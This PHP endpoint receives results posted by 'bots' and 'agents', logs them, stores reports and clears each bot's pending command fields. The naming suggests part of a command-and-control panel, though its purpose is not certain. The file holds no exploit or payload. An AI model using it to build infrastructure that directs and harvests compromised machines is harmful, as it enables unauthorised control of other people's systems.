<?php
include "../../settings/settings.php";

function writeToLog($message) {
    error_log(date('Y-m-d H:i:s') . ": " . $message . "\n", 3, '../../logs/get_results.log');
}

function generateReportId() {
    $characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $reportId = '#';
    for ($i = 0; $i < 14; $i++) {
        $reportId .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $reportId;
}

// Check if the request method is POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // Retrieve POST parameters
    $bot_id = $_POST['bot_id'] ?? null;
    $bot_name = $_POST['bot_name'] ?? null;
    $agent_name = $_POST['agent_name'] ?? null;
    $sr_content = $_POST['sr_content'] ?? null;

    // Log the received parameters
    writeToLog("Received parameters: bot_id=$bot_id, bot_name=$bot_name, agent_name=$agent_name, sr_content=$sr_content");

    // Prepare to insert into logs table
    $stmt_log = $conn->prepare("INSERT INTO logs (agent, bot, content) VALUES (?, ?, ?)");
    $stmt_log->bind_param("sss", $agent_name, $bot_name, $sr_content);

    // Execute the insert statement for logs
    if ($stmt_log->execute()) {
        // Generate report_id
        $report_id = generateReportId();

        // Prepare to insert into report table
        $stmt_report = $conn->prepare("INSERT INTO report (report_id, bot_name, content) VALUES (?, ?, ?)");
        $stmt_report->bind_param("sss", $report_id, $bot_name, $sr_content);

        // Execute the insert statement for report
        if ($stmt_report->execute()) {
            // Update inspected status and clear cmd_sent and cmd_received in bots table
            $stmt_update = $conn->prepare("UPDATE bots SET inspected = 1, cmd_sent = '', cmd_received = '' WHERE id = ?");
            $stmt_update->bind_param("i", $bot_id);

            if ($stmt_update->execute()) {
                $response = [
                    'status' => 'success',
                    'message' => 'Log and report entries created, bot inspected status updated, and command fields cleared.'
                ];
            } else {
                $response = [
                    'status' => 'error',
                    'message' => 'Failed to update bot inspected status and clear command fields.'
                ];
            }
            $stmt_update->close();
        } else {
            $response = [
                'status' => 'error',
                'message' => 'Failed to write report entry.'
            ];
        }
        $stmt_report->close();
    } else {
        $response = [
            'status' => 'error',
            'message' => 'Failed to write log entry.'
        ];
    }
    $stmt_log->close();
} else {
    // Handle non-POST requests
    $response = [
        'status' => 'error',
        'message' => 'Invalid request method. Please use POST.'
    ];
}

// Return the result as JSON
header('Content-Type: application/json');
echo json_encode($response);
?>
